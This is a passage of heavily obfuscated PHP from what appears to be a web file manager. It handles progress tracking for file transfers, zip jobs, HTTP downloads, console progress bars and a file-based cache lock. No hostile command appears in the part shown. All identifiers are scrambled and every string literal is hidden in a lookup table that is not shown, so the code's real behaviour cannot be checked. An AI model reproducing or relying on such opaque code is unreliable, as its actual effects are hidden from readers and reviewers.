Hook::bind($²Ê´€–‹[1812], array($this, $²Ê´€–‹[1813])); Hook::bind($²Ê´€–‹[1319], array($this, $²Ê´€–‹[1814])); Hook::bind($²Ê´€–‹[1815], array($this, $²Ê´€–‹[1816])); Hook::bind($²Ê´€–‹[668], array($this, $²Ê´€–‹[1817])); Hook::bind($²Ê´€–‹[669], array($this, $²Ê´€–‹[1818])); Hook::bind($²Ê´€–‹[675], array($this, $²Ê´€–‹[1819])); Hook::bind($²Ê´€–‹[676], array($this, $²Ê´€–‹[1820])); Hook::bind($²Ê´€–‹[671], array($this, $²Ê´€–‹[1821])); Hook::bind($²Ê´€–‹[673], array($this, $²Ê´€–‹[1822])); Hook::bind($²Ê´€–‹[637], array($this, $²Ê´€–‹[1823])); Hook::bind($²Ê´€–‹[634], array($this, $²Ê´€–‹[1823])); Hook::bind($²Ê´€–‹[639], array($this, $²Ê´€–‹[1823])); Hook::bind($²Ê´€–‹[641], array($this, $²Ê´€–‹[1823])); Hook::bind($²Ê´€–‹[643], array($this, $²Ê´€–‹[1823])); Hook::bind($²Ê´€–‹[1824], array($this, $²Ê´€–‹[1825])); Hook::bind($²Ê´€–‹[659], array($this, $²Ê´€–‹[1826])); $this->sourceModelCopyFlag = !1; Hook::bind($²Ê´€–‹[1827], array($this, $²Ê´€–‹[1828])); Hook::bind($²Ê´€–‹[1829], array($this, $²Ê´€–‹[1830])); Hook::bind($²Ê´€–‹[1831], array($this, $²Ê´€–‹[1832])); $îö“­û‹[$²Ê´€–‹[1833]] = LNG($²Ê´€–‹[1834]); $îö“­û‹[$²Ê´€–‹[1835]] = 0; $îö“­û‹[$²Ê´€–‹[1836]] = 0; $îö“­û‹[$²Ê´€–‹[1154]] = $²Ê´€–‹[12]; $îö“­û‹[$²Ê´€–‹[1837]] = $²Ê´€–‹[12]; $îö“­û‹[$²Ê´€–‹[1838]] = 0; $îö“­û‹[$²Ê´€–‹[1839]] = 0; $îö“­û‹[$²Ê´€–‹[1840]] = 0; if (!$îö“­û‹[$²Ê´€–‹[1671]]) { $îö“­û‹[$²Ê´€–‹[1671]] = LNG($²Ê´€–‹[1841]); } } protected function endAfter() { $æ¡¥”˜¢ =& $_SERVER[íïàËŸë]; Hook::unbind($æ¡¥”˜¢[1812], array($this, $æ¡¥”˜¢[1813])); Hook::unbind($æ¡¥”˜¢[1319], array($this, $æ¡¥”˜¢[1814])); Hook::unbind($æ¡¥”˜¢[1815], array($this, $æ¡¥”˜¢[1816])); Hook::unbind($æ¡¥”˜¢[668], array($this, $æ¡¥”˜¢[1817])); Hook::unbind($æ¡¥”˜¢[669], array($this, $æ¡¥”˜¢[1818])); Hook::unbind($æ¡¥”˜¢[675], array($this, $æ¡¥”˜¢[1819])); Hook::unbind($æ¡¥”˜¢[676], array($this, $æ¡¥”˜¢[1820])); Hook::unbind($æ¡¥”˜¢[671], array($this, $æ¡¥”˜¢[1821])); Hook::unbind($æ¡¥”˜¢[673], array($this, $æ¡¥”˜¢[1822])); Hook::unbind($æ¡¥”˜¢[637], array($this, $æ¡¥”˜¢[1823])); Hook::unbind($æ¡¥”˜¢[634], array($this, $æ¡¥”˜¢[1823])); Hook::unbind($æ¡¥”˜¢[639], array($this, $æ¡¥”˜¢[1823])); Hook::unbind($æ¡¥”˜¢[641], array($this, $æ¡¥”˜¢[1823])); Hook::unbind($æ¡¥”˜¢[643], array($this, $æ¡¥”˜¢[1823])); Hook::unbind($æ¡¥”˜¢[1824], array($this, $æ¡¥”˜¢[1825])); Hook::unbind($æ¡¥”˜¢[659], array($this, $æ¡¥”˜¢[1826])); Hook::unbind($æ¡¥”˜¢[1827], array($this, $æ¡¥”˜¢[1828])); Hook::unbind($æ¡¥”˜¢[1829], array($this, $æ¡¥”˜¢[1830])); Hook::unbind($æ¡¥”˜¢[1831], array($this, $æ¡¥”˜¢[1832])); } public function copyMoveStart($Æ‚´è½©, $ÄÉ¨Šèâ, $·³•ÖÀ§, $ÀƒÓÃ¥­) { $Ñæ’Âî¦ =& $_SERVER[íïàËŸë]; self::log($Ñæ’Âî¦[1842] . $ÄÉ¨Šèâ . $Ñæ’Âî¦[73] . $ÀƒÓÃ¥­); $Ì’Å£©° = rtrim(TEMP_FILES, $Ñæ’Âî¦[8]); if (substr($ÄÉ¨Šèâ, 0, strlen($Ì’Å£©°)) == $Ì’Å£©°) { return; } if (substr($ÀƒÓÃ¥­, 0, strlen($Ì’Å£©°)) == $Ì’Å£©°) { return; } $‚õºèá =& $this->task; $‚õºèá[$Ñæ’Âî¦[1843]] = KodIO::transferType($Æ‚´è½©, $·³•ÖÀ§); $this->update(); } public function updateAfter() { $ˆèëÃ­¾ =& $_SERVER[íïàËŸë]; $¦Å…§ï =& $this->task; if (!$¦Å…§ï[$ˆèëÃ­¾[846]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¦Å…§ï[$ˆèëÃ­¾[1843]] == $ˆèëÃ­¾[1412]) { return; } self::updateTask($¦Å…§ï); } private static function updateTask(&$Üë‰„‹Œ) { $¢ĞÄàµ =& $_SERVER[íïàËŸë]; if ($Üë‰„‹Œ[$¢ĞÄàµ[1843]] == $¢ĞÄàµ[1290] || $Üë‰„‹Œ[$¢ĞÄàµ[1843]] == $¢ĞÄàµ[110]) { if ($Üë‰„‹Œ[$¢ĞÄàµ[1837]]) { $Üë‰„‹Œ[$¢ĞÄàµ[1840]] = $Üë‰„‹Œ[$¢ĞÄàµ[1839]] + $Üë‰„‹Œ[$¢ĞÄàµ[1836]]; } } else { if ($Üë‰„‹Œ[$¢ĞÄàµ[1843]] == $¢ĞÄàµ[1413]) { if ($Üë‰„‹Œ[$¢ĞÄàµ[1837]] == $¢ĞÄàµ[1290]) { $Üë‰„‹Œ[$¢ĞÄàµ[1840]] = $Üë‰„‹Œ[$¢ĞÄàµ[1839]] + $Üë‰„‹Œ[$¢ĞÄàµ[1836]] * 0.5; } else { if ($Üë‰„‹Œ[$¢ĞÄàµ[1837]] == $¢ĞÄàµ[110]) { $Üë‰„‹Œ[$¢ĞÄàµ[1840]] = $Üë‰„‹Œ[$¢ĞÄàµ[1839]] + $Üë‰„‹Œ[$¢ĞÄàµ[1835]] * 0.5 + $Üë‰„‹Œ[$¢ĞÄàµ[1836]] * 0.5; } } } } $Üë‰„‹Œ[$¢ĞÄàµ[1784]] = $Üë‰„‹Œ[$¢ĞÄàµ[1840]] / $Üë‰„‹Œ[$¢ĞÄàµ[846]]; if ($Üë‰„‹Œ[$¢ĞÄàµ[1784]] > 0) { $Î¥Ğñ  = timeFloat() - $Üë‰„‹Œ[$¢ĞÄàµ[1786]] - $Üë‰„‹Œ[$¢ĞÄàµ[1789]]; $Üë‰„‹Œ[$¢ĞÄàµ[1790]] = $Î¥Ğñ  * (1 - $Üë‰„‹Œ[$¢ĞÄàµ[1784]]) / $Üë‰„‹Œ[$¢ĞÄàµ[1784]]; } } public function addPath($ìÏè—˜°) { $İ¦äçØ =& $_SERVER[íïàËŸë]; if (!$ìÏè—˜°) { return; } $ñòÌ‹‡Í =& $this->task; $“†Ãé› = IO::infoWithChildren($ìÏè—˜°); $¶‹ÎŒ“ = $ñòÌ‹‡Í[$İ¦äçØ[1844]] ? $ñòÌ‹‡Í[$İ¦äçØ[1844]][$İ¦äçØ[1845]] : 0; $ñòÌ‹‡Í[$İ¦äçØ[1844]] = array($İ¦äçØ[1845] => $¶‹ÎŒ“ + 1, $İ¦äçØ[494] => $“†Ãé›[$İ¦äçØ[32]], $İ¦äçØ[87] => $“†Ãé›[$İ¦äçØ[87]], $İ¦äçØ[582] => $“†Ãé›[$İ¦äçØ[582]] ? $“†Ãé›[$İ¦äçØ[582]] : $“†Ãé›[$İ¦äçØ[87]]); if ($“†Ãé›[$İ¦äçØ[33]] == $İ¦äçØ[230]) { $ñòÌ‹‡Í[$İ¦äçØ[1152]] += 1; } else { $ñòÌ‹‡Í[$İ¦äçØ[1152]] += $“†Ãé›[$İ¦äçØ[82]][$İ¦äçØ[80]]; if ($“†Ãé›[$İ¦äçØ[193]]) { $ñòÌ‹‡Í[$İ¦äçØ[1152]] += $“†Ãé›[$İ¦äçØ[82]][$İ¦äçØ[81]] + 1; } } $ñòÌ‹‡Í[$İ¦äçØ[846]] += $“†Ãé›[$İ¦äçØ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¶É¥—¦) { } public function sourceAddHashEnd($üèåâÑ) { } public function sourceAddFileStart($’öâñèÊ) { $÷’®Á› =& $_SERVER[íïàËŸë]; $…Õ¬ÕÕÉ =& $this->task; $…Õ¬ÕÕÉ[$÷’®Á›[1835]] = $’öâñèÊ[$÷’®Á›[79]]; $…Õ¬ÕÕÉ[$÷’®Á›[1833]] = $’öâñèÊ[$÷’®Á›[32]]; $…Õ¬ÕÕÉ[$÷’®Á›[1154]] = $’öâñèÊ[$÷’®Á›[32]]; $…Õ¬ÕÕÉ[$÷’®Á›[1846]] = $’öâñèÊ[$÷’®Á›[87]]; $this->update(); } public function sourceAddFileEnd($éŸç×—×) { $ˆËªåó =& $_SERVER[íïàËŸë]; $­©ñÃ÷ =& $this->task; $­©ñÃ÷[$ˆËªåó[1840]] += $éŸç×—×[$ˆËªåó[79]]; $­©ñÃ÷[$ˆËªåó[1846]] = $éŸç×—×[$ˆËªåó[87]]; $this->update(1); } public function copyFileStart($ËÓ™¼¾, $ƒşíêÜ½, $ˆ÷ÌÂË, $¼ÃàŒ»’, $†¸ò´¨å, $¾ÙÍš–Û) { $»áÈ†°ˆ =& $_SERVER[íïàËŸë]; $äØÆ¾Ÿ = $†¸ò´¨å; if ($äØÆ¾Ÿ == $GLOBALS[$»áÈ†°ˆ[1847]]) { $äØÆ¾Ÿ = $GLOBALS[$»áÈ†°ˆ[1848]]; } $GLOBALS[$»áÈ†°ˆ[1848]] = $†¸ò´¨å; $GLOBALS[$»áÈ†°ˆ[1847]] = $¾ÙÍš–Û; $¾›¦Ô£Ñ =& $this->task; $¾›¦Ô£Ñ[$»áÈ†°ˆ[1833]] = $äØÆ¾Ÿ; $¾›¦Ô£Ñ[$»áÈ†°ˆ[1835]] = (int) $ËÓ™¼¾->size($ƒşíêÜ½); $¾›¦Ô£Ñ[$»áÈ†°ˆ[1836]] = 0; $¾›¦Ô£Ñ[$»áÈ†°ˆ[1154]] = $»áÈ†°ˆ[12]; $¾›¦Ô£Ñ[$»áÈ†°ˆ[1837]] = $»áÈ†°ˆ[12]; $¾›¦Ô£Ñ[$»áÈ†°ˆ[1838]] = 0; $ˆÜ§Î‹Õ = $¾›¦Ô£Ñ[$»áÈ†°ˆ[1835]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¾›¦Ô£Ñ[$»áÈ†°ˆ[475]] . $»áÈ†°ˆ[1849]); if ($ˆÜ§Î‹Õ && file_exists(get_path_father($¼ÃàŒ»’))) { Cache::set($¾›¦Ô£Ñ[$»áÈ†°ˆ[475]] . $»áÈ†°ˆ[1849], $¼ÃàŒ»’); $¾›¦Ô£Ñ[$»áÈ†°ˆ[1806]] = array($»áÈ†°ˆ[1850], $»áÈ†°ˆ[1851]); } $this->update(0, $ˆÜ§Î‹Õ); } public static function updateCopyLocalFileSize($ï›±ª–ö) { $ïÜ´Ñ±Ë =& $_SERVER[íïàËŸë]; $ó»Ç×•¼ = Cache::get($ï›±ª–ö[$ïÜ´Ñ±Ë[475]] . $ïÜ´Ñ±Ë[1849]); if (!$ó»Ç×•¼ || !file_exists($ó»Ç×•¼)) { return $ï›±ª–ö; } $ï›±ª–ö[$ïÜ´Ñ±Ë[1836]] = @filesize($ó»Ç×•¼); $ï›±ª–ö[$ïÜ´Ñ±Ë[1840]] += $ï›±ª–ö[$ïÜ´Ñ±Ë[1836]]; self::updateTask($ï›±ª–ö); return $ï›±ª–ö; } public function copyFileEnd($Í©Ìê—Å, $í¾ó¬™î, $ì™ê³, $ÜçÔ÷´, $×ã‘³àš, $¦ïØÚª‘) { $Œ“«Í‚ò =& $_SERVER[íïàËŸë]; $ÁÎŠŸßá =& $this->task; $ÁÎŠŸßá[$Œ“«Í‚ò[1836]] = $ÁÎŠŸßá[$Œ“«Í‚ò[1835]]; $ÁÎŠŸßá[$Œ“«Í‚ò[1837]] = $Œ“«Í‚ò[12]; unset($ÁÎŠŸßá[$Œ“«Í‚ò[1806]]); if ($×ã‘³àš == $ÁÎŠŸßá[$Œ“«Í‚ò[1833]]) { $ÁÎŠŸßá[$Œ“«Í‚ò[1839]] += $ÁÎŠŸßá[$Œ“«Í‚ò[1835]]; $ÁÎŠŸßá[$Œ“«Í‚ò[1840]] = $ÁÎŠŸßá[$Œ“«Í‚ò[1839]]; $‹†“èæÚ = 1; if (isset($ÁÎŠŸßá[$Œ“«Í‚ò[1846]]) && $ÁÎŠŸßá[$Œ“«Í‚ò[1846]] == $í¾ó¬™î) { $‹†“èæÚ = 0; } $this->update($‹†“èæÚ); } else { $this->update(); $ÁÎŠŸßá[$Œ“«Í‚ò[1836]] = 0; } Cache::remove($ÁÎŠŸßá[$Œ“«Í‚ò[475]] . $Œ“«Í‚ò[1849]); self::log($Œ“«Í‚ò[1852] . $í¾ó¬™î . $Œ“«Í‚ò[73] . $ÜçÔ÷´ . $Œ“«Í‚ò[262] . $×ã‘³àš . $Œ“«Í‚ò[1853] . $ÁÎŠŸßá[$Œ“«Í‚ò[1833]]); } public function updateFileEnd($¾—”‰É, $¢§ ¢è‡) { $ş¥ß£ô» =& $_SERVER[íïàËŸë]; $è­ãëô =& $this->task; $è­ãëô[$ş¥ß£ô»[1833]] = $¾—”‰É; $è­ãëô[$ş¥ß£ô»[1835]] = $¢§ ¢è‡; $è­ãëô[$ş¥ß£ô»[1839]] += $¢§ ¢è‡; $è­ãëô[$ş¥ß£ô»[1840]] = $è­ãëô[$ş¥ß£ô»[1839]]; $this->update(1); self::log($ş¥ß£ô»[1854] . $¾—”‰É); } public function sourceModelCopy($Ğ·äÔ·¬) { $Ë»­×ŸÁ =& $_SERVER[íïàËŸë]; $ïšÖãè = $Ğ·äÔ·¬[0]; $øŞşáØÄ = $Ğ·äÔ·¬[1]; $Ê·Ì©Ò¦ =& $this->task; $this->sourceModelCopyFlag = !0; $®ÛŸ¬Ã = 0; switch ($ïšÖãè) { case $Ë»­×ŸÁ[635]: $®ÛŸ¬Ã = 1; break; case $Ë»­×ŸÁ[638]: $Ê·Ì©Ò¦[$Ë»­×ŸÁ[1833]] = $øŞşáØÄ[$Ë»­×ŸÁ[32]]; break; case $Ë»­×ŸÁ[640]: $®ÛŸ¬Ã = intval($Ğ·äÔ·¬[$Ë»­×ŸÁ[456]] * 0.4); break; case $Ë»­×ŸÁ[642]: $®ÛŸ¬Ã = intval($Ğ·äÔ·¬[$Ë»­×ŸÁ[456]] * 0.2); break; case $Ë»­×ŸÁ[644]: $®ÛŸ¬Ã = intval($Ğ·äÔ·¬[$Ë»­×ŸÁ[456]] * 0.4); break; } $this->update($®ÛŸ¬Ã); $this->sourceModelCopyFlag = !1; } public function sourceRemove($úŒ°³ùå, $¿íÇ“ş) { $©ßàÛäÄ =& $_SERVER[íïàËŸë]; $this->sourceModelCopyFlag = !0; $úİÊ€»Æ = 1; if (isset($úŒ°³ùå[$©ßàÛäÄ[82]])) { $úİÊ€»Æ = $úŒ°³ùå[$©ßàÛäÄ[82]][$©ßàÛäÄ[80]]; $úİÊ€»Æ = $úİÊ€»Æ + $úŒ°³ùå[$©ßàÛäÄ[82]][$©ßàÛäÄ[81]] + 1; } $this->update($úİÊ€»Æ); $this->sourceModelCopyFlag = !1; } public function sourceMove($íü‰‚®) { $this->sourceRemove($íü‰‚®, !1); } public function curlProgress($«ÃÈ±¢Á, $ºıŒÛàÎ, $®Ç¯úÚà, $•¡‡¡à, $ÅñÙÓ) { $–ğ¶Œß =& $_SERVER[íïàËŸë]; $‰‚õß”¶ =& $this->task; if ($ÅñÙÓ > 0) { $‰‚õß”¶[$–ğ¶Œß[1154]] = $–ğ¶Œß[1855]; $‰‚õß”¶[$–ğ¶Œß[1837]] = $–ğ¶Œß[110]; if ($‰‚õß”¶[$–ğ¶Œß[1835]]) { $‰‚õß”¶[$–ğ¶Œß[1836]] = $ÅñÙÓ; } if ($‰‚õß”¶[$–ğ¶Œß[1838]]) { $‰‚õß”¶[$–ğ¶Œß[1836]] = $ÅñÙÓ + $‰‚õß”¶[$–ğ¶Œß[1838]]; } } else { if ($®Ç¯úÚà > 0) { if ($‰‚õß”¶[$–ğ¶Œß[1835]] == $ºıŒÛàÎ) { $‰‚õß”¶[$–ğ¶Œß[1836]] = $®Ç¯úÚà; $‰‚õß”¶[$–ğ¶Œß[1154]] = $–ğ¶Œß[1856]; $‰‚õß”¶[$–ğ¶Œß[1837]] = $–ğ¶Œß[1290]; } } } $this->update(); } public function curlProgressStart($œ®¾ëüş) { } public function curlProgressEnd($ÑèİÇÎô) { $Ó¦¢ïùÄ =& $_SERVER[íïàËŸë]; $Á®§Ööó =& $this->task; $®ì¨¬ï÷ = curl_getinfo($ÑèİÇÎô); $¼ÊŒü“Ü = $®ì¨¬ï÷[$Ó¦¢ïùÄ[1857]]; if ($¼ÊŒü“Ü == -1) { $¼ÊŒü“Ü = $®ì¨¬ï÷[$Ó¦¢ïùÄ[1858]]; } if ($Á®§Ööó[$Ó¦¢ïùÄ[1837]] == $Ó¦¢ïùÄ[110] && $¼ÊŒü“Ü) { $Á®§Ööó[$Ó¦¢ïùÄ[1838]] += $¼ÊŒü“Ü; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $·™Øå =& $_SERVER[íïàËŸë]; $Î¤ºŸØ¢ =& $this->task; $Î¤ºŸØ¢[$·™Øå[1859]] = 1; Hook::bind($·™Øå[1827], array($this, $·™Øå[1860])); Hook::bind($·™Øå[1829], array($this, $·™Øå[1861])); Hook::bind($·™Øå[1831], array($this, $·™Øå[1862])); } protected function endAfter() { $¶å®‹Â =& $_SERVER[íïàËŸë]; Hook::unbind($¶å®‹Â[1827], array($this, $¶å®‹Â[1860])); Hook::unbind($¶å®‹Â[1829], array($this, $¶å®‹Â[1861])); Hook::unbind($¶å®‹Â[1831], array($this, $¶å®‹Â[1862])); } public function progressStart($øœ°¤Ç¨) { $Š–šÇò÷ =& $_SERVER[íïàËŸë]; $Í¸Î Œï = curl_getinfo($øœ°¤Ç¨); self::log($Š–šÇò÷[1863] . $Í¸Î Œï[$Š–šÇò÷[383]]); self::valueSet($this->task[$Š–šÇò÷[475]], $this->task); } public function progressEnd($úŒŸø·Ù) { $‚¦ñ¥º“ =& $_SERVER[íïàËŸë]; self::log($‚¦ñ¥º“[1864] . $this->task[$‚¦ñ¥º“[475]]); $this->end(); } public function progress($§ÔôÍè£, $ŒÊ”›Åî, $îˆ÷ÏÒğ, $¤–¤õÃÅ, $éÆ›³Ï) { $¤Ê¯éŒš =& $_SERVER[íïàËŸë]; $Ø´â½‰Ü =& $this->task; if ($éÆ›³Ï > 0) { $Ø´â½‰Ü[$¤Ê¯éŒš[1152]] = $Ø´â½‰Ü[$¤Ê¯éŒš[1152]] == 0 ? $¤–¤õÃÅ : $Ø´â½‰Ü[$¤Ê¯éŒš[1152]]; $Ø´â½‰Ü[$¤Ê¯éŒš[1783]] = $éÆ›³Ï; } else { if ($îˆ÷ÏÒğ > 0) { $Ø´â½‰Ü[$¤Ê¯éŒš[1152]] = $Ø´â½‰Ü[$¤Ê¯éŒš[1152]] == 0 ? $ŒÊ”›Åî : $Ø´â½‰Ü[$¤Ê¯éŒš[1152]]; $Ø´â½‰Ü[$¤Ê¯éŒš[1783]] = $îˆ÷ÏÒğ; } } $this->update(); self::log("\160\162\157\x67\162\145\163\x73\110\164\x74\160\x3a\144\x6f\167\156\x3a{$îˆ÷ÏÒğ}\57{$ŒÊ”›Åî}\73\40\x75\160\x6c\157\x61\x64\72{$éÆ›³Ï}\x2f{$¤–¤õÃÅ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($°Ì£©ïÂ, $ä„€©ˆ = '', $ñÈé¨àü = 0, $•ÃÎõ°© = '') { $““û®©ğ =& $_SERVER[íïàËŸë]; $•ÃÎõ°© = $•ÃÎõ°© ? $•ÃÎõ°© : ($ä„€©ˆ ? $ä„€©ˆ : $°Ì£©ïÂ); $–Ù°œˆ = new Task($°Ì£©ïÂ, $ä„€©ˆ, $ñÈé¨àü, $•ÃÎõ°©); $GLOBALS[$““û®©ğ[1865] . $°Ì£©ïÂ] = new TaskLog($““û®©ğ[1766], $–Ù°œˆ, $•ÃÎõ°©); return $–Ù°œˆ; } public function __construct($œ“´Ææº = '', $æÅ µĞ÷ = '', $¥ğì–€ = '') { $Ìœ–¿Ğ¥ =& $_SERVER[íïàËŸë]; if (!$œ“´Ææº) { $œ“´Ææº = $Ìœ–¿Ğ¥[1766]; } $é‡˜¤úû = $œ“´Ææº . $Ìœ–¿Ğ¥[462] . rand_string(10); if (!$¥ğì–€) { $¥ğì–€ = $œ“´Ææº . $Ìœ–¿Ğ¥[53] . $¥ğì–€; } switch ($œ“´Ææº) { case $Ìœ–¿Ğ¥[1766]: if (!$æÅ µĞ÷ || !$æÅ µĞ÷->task) { return echoLog($œ“´Ææº . $Ìœ–¿Ğ¥[1866]); } $­ÓäÖ«¸ = $æÅ µĞ÷; $é‡˜¤úû = $­ÓäÖ«¸->task[$Ìœ–¿Ğ¥[475]]; $œ“´Ææº = $­ÓäÖ«¸->task[$Ìœ–¿Ğ¥[475]]; if (!$­ÓäÖ«¸->task[$Ìœ–¿Ğ¥[1671]]) { $­ÓäÖ«¸->task[$Ìœ–¿Ğ¥[1671]] = $¥ğì–€ ? $¥ğì–€ : $œ“´Ææº; } break; case $Ìœ–¿Ğ¥[1867]: if (!$æÅ µĞ÷) { return echoLog($œ“´Ææº . $Ìœ–¿Ğ¥[1868]); } $¶¶àšÏ» = is_string($æÅ µĞ÷) ? array($æÅ µĞ÷) : $æÅ µĞ÷; $­ÓäÖ«¸ = new TaskFileTransfer($é‡˜¤úû, $œ“´Ææº, 0, $¥ğì–€ ? $¥ğì–€ : $¶¶àšÏ»[0]); foreach ($¶¶àšÏ» as $õì×–¿†) { $­ÓäÖ«¸->addPath($õì×–¿†); } break; case $Ìœ–¿Ğ¥[389]: if (!$æÅ µĞ÷) { return echoLog($œ“´Ææº . $Ìœ–¿Ğ¥[1868]); } $¶¶àšÏ» = is_string($æÅ µĞ÷) ? array($æÅ µĞ÷) : $æÅ µĞ÷; $­ÓäÖ«¸ = new TaskZip($é‡˜¤úû, $œ“´Ææº, 0, $¥ğì–€ ? $¥ğì–€ : $¶¶àšÏ»[0]); foreach ($¶¶àšÏ» as $õì×–¿†) { $­ÓäÖ«¸->addPath($õì×–¿†); } break; case $Ìœ–¿Ğ¥[1310]: if (!$æÅ µĞ÷) { return echoLog($œ“´Ææº . $Ìœ–¿Ğ¥[1868]); } $­ÓäÖ«¸ = new TaskUnZip($é‡˜¤úû, $œ“´Ææº, 0, $¥ğì–€ ? $¥ğì–€ : $æÅ µĞ÷); if ($æÅ µĞ÷) { $­ÓäÖ«¸->addFile($æÅ µĞ÷); } break; case $Ìœ–¿Ğ¥[152]: $­ÓäÖ«¸ = new TaskHttp($é‡˜¤úû, $œ“´Ææº); break; default: return; break; } $this->task = $­ÓäÖ«¸; $this->taskID = $é‡˜¤úû; Hook::bind($Ìœ–¿Ğ¥[1803], array($this, $Ìœ–¿Ğ¥[1869])); Hook::bind($Ìœ–¿Ğ¥[1805], array($this, $Ìœ–¿Ğ¥[1870])); Hook::bind($Ìœ–¿Ğ¥[1799], array($this, $Ìœ–¿Ğ¥[1871])); echoLog($Ìœ–¿Ğ¥[1872] . $­ÓäÖ«¸->task[$Ìœ–¿Ğ¥[1671]]); } public function __destruct() { $this->end(); } public function end($·’×Ïã¶ = '') { $»Æ¹‡¹ =& $_SERVER[íïàËŸë]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($·’×Ïã¶); $this->task = !1; $this->taskID = !1; Hook::unbind($»Æ¹‡¹[1803], array($this, $»Æ¹‡¹[1869])); Hook::unbind($»Æ¹‡¹[1805], array($this, $»Æ¹‡¹[1870])); Hook::unbind($»Æ¹‡¹[1799], array($this, $»Æ¹‡¹[1871])); } public function taskUpdate($¯™÷¡Ã–) { $çÅªıÙ =& $_SERVER[íïàËŸë]; if (!$¯™÷¡Ã– || $this->taskID != $¯™÷¡Ã–[$çÅªıÙ[475]]) { return; } $ÖÔ±é£æ = 20; $Ò¡°è†º = intval($¯™÷¡Ã–[$çÅªıÙ[1784]] * $ÖÔ±é£æ); $ş¦°Á•Ú = $çÅªıÙ[176] . str_repeat($çÅªıÙ[973], $Ò¡°è†º) . $çÅªıÙ[1103] . str_repeat($çÅªıÙ[53], $ÖÔ±é£æ - $Ò¡°è†º) . $çÅªıÙ[178]; $ÔªÖ ­Û = $ş¦°Á•Ú . sprintf($çÅªıÙ[1873], $¯™÷¡Ã–[$çÅªıÙ[1784]] * 100) . $çÅªıÙ[1874]; $ÑàÅß× = $ÔªÖ ­Û . $¯™÷¡Ã–[$çÅªıÙ[1783]] . $çÅªıÙ[8] . $¯™÷¡Ã–[$çÅªıÙ[1152]] . LNG($çÅªıÙ[1875]); $‹¦›µŞ = $çÅªıÙ[12]; if ($¯™÷¡Ã–[$çÅªıÙ[1859]]) { $ÑàÅß× = $ÔªÖ ­Û . size_format($¯™÷¡Ã–[$çÅªıÙ[1783]]) . $çÅªıÙ[8] . size_format($¯™÷¡Ã–[$çÅªıÙ[1152]]); $‹¦›µŞ = size_format($¯™÷¡Ã–[$çÅªıÙ[1785]]) . $çÅªıÙ[1876]; } if ($¯™÷¡Ã–[$çÅªıÙ[1154]]) { $¯™÷¡Ã–[$çÅªıÙ[1833]] = $¯™÷¡Ã–[$çÅªıÙ[1154]] . $çÅªıÙ[53] . $¯™÷¡Ã–[$çÅªıÙ[1833]]; } if ($¯™÷¡Ã–[$çÅªıÙ[1833]]) { $Õª•ÇÚœ = $çÅªıÙ[12]; if ($¯™÷¡Ã–[$çÅªıÙ[1835]]) { $Õª•ÇÚœ = $çÅªıÙ[50] . size_format($¯™÷¡Ã–[$çÅªıÙ[1836]]) . $çÅªıÙ[8] . size_format($¯™÷¡Ã–[$çÅªıÙ[1835]]); } $‹¦›µŞ .= $¯™÷¡Ã–[$çÅªıÙ[1833]] . $Õª•ÇÚœ; } if ($¯™÷¡Ã–[$çÅªıÙ[846]] && !$¯™÷¡Ã–[$çÅªıÙ[1835]]) { $‹¦›µŞ .= $çÅªıÙ[53] . size_format($¯™÷¡Ã–[$çÅªıÙ[1840]]) . $çÅªıÙ[8] . size_format($¯™÷¡Ã–[$çÅªıÙ[846]]); } echoLog($ÑàÅß× . $çÅªıÙ[53] . $‹¦›µŞ, !0); } public function taskEnd($Ü—§üš) { $ÆıßÑ =& $_SERVER[íïàËŸë]; if (!$Ü—§üš || $this->taskID != $Ü—§üš[$ÆıßÑ[475]]) { return; } $øÉ¬¹Åü = $Ü—§üš ? $Ü—§üš[$ÆıßÑ[1783]] . $ÆıßÑ[8] . $Ü—§üš[$ÆıßÑ[1152]] . LNG($ÆıßÑ[1875]) . $ÆıßÑ[74] : $ÆıßÑ[12]; echoLog($ÆıßÑ[1877] . $Ü—§üš[$ÆıßÑ[1671]] . ($Ü—§üš[$ÆıßÑ[526]] ? $ÆıßÑ[74] . $Ü—§üš[$ÆıßÑ[526]] : $ÆıßÑ[12]) . $ÆıßÑ[74] . $øÉ¬¹Åü . $ÆıßÑ[1878] . sprintf($ÆıßÑ[940], timeFloat() - $Ü—§üš[$ÆıßÑ[1786]]) . $ÆıßÑ[1798]); $this->end(); } public function taskKill($Å¬·Æ…å) { $ˆàòÒ¾Ö =& $_SERVER[íïàËŸë]; if (!$Å¬·Æ…å || $this->taskID != $Å¬·Æ…å[$ˆàòÒ¾Ö[475]]) { return; } echoLog($ˆàòÒ¾Ö[1879] . $Å¬·Æ…å[$ˆàòÒ¾Ö[1671]]); } } goto DÌ©¨Šøê; EŠó¤Ëí: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‚“½âĞÀ =& $_SERVER[íïàËŸë]; $¹çğÇé÷ = $GLOBALS[$‚“½âĞÀ[6]][$‚“½âĞÀ[425]]; self::$cachePath = $¹çğÇé÷[$‚“½âĞÀ[230]][$‚“½âĞÀ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($áü²…²°, $¥¹­”óƒ = 0) { $É§™Ÿı =& $_SERVER[íïàËŸë]; $âÎà‰ô = microtime(!0); $¯ïÍÈÔ = $âÎà‰ô + $¥¹­”óƒ + 0.0001; $±Å¨Õ = rtrim(self::$cachePath, $É§™Ÿı[8]) . $É§™Ÿı[953] . md5($áü²…²°) . $É§™Ÿı[950]; if (file_exists($±Å¨Õ) && filemtime($±Å¨Õ) && filemtime($±Å¨Õ) < time() - 10) { @unlink($±Å¨Õ); } do { if (file_exists($±Å¨Õ)) { cacheLockWait(); continue; } $¤®ôŠÈÔ = fopen($±Å¨Õ, $É§™Ÿı[954]); if (!$¤®ôŠÈÔ) { return !1; } $í“ªÜ† = flock($¤®ôŠÈÔ, LOCK_EX | LOCK_NB); self::$caches[$áü²…²°] = array($É§™Ÿı[955] => $¤®ôŠÈÔ, $É§™Ÿı[230] => $±Å¨Õ); fwrite($¤®ôŠÈÔ, $¯ïÍÈÔ); clearstatcache(); if ($¤®ôŠÈÔ && $í“ªÜ†) { return !0; } cacheLockWait(); } while (microtime(!0) < $¯ïÍÈÔ); $this->unlock($áü²…²°); return !1; } public function 